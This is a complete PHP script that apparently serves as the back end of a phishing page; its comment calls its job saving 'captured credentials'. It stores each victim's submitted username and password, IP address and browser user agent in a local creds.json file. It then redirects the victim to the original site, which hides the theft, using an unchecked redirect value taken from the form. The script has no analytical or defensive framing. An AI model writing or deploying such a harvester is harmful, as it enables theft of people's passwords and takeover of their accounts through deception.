<?php
// Save captured credentials
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if ($username || $password) {
    $credentials = [
        'id' => uniqid(),
        'timestamp' => date('Y-m-d H:i:s'),
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    
    $creds_file = 'creds.json';
    $creds = [];
    
    if (file_exists($creds_file)) {
        $creds = json_decode(file_get_contents($creds_file), true) ?: [];
    }
    
    $creds[] = $credentials;
    file_put_contents($creds_file, json_encode($creds, JSON_PRETTY_PRINT));
}

// Redirect to the original site
header('Location: ' . (isset($_POST['redirect']) ? $_POST['redirect'] : 'https://google.com'));
exit;
?>
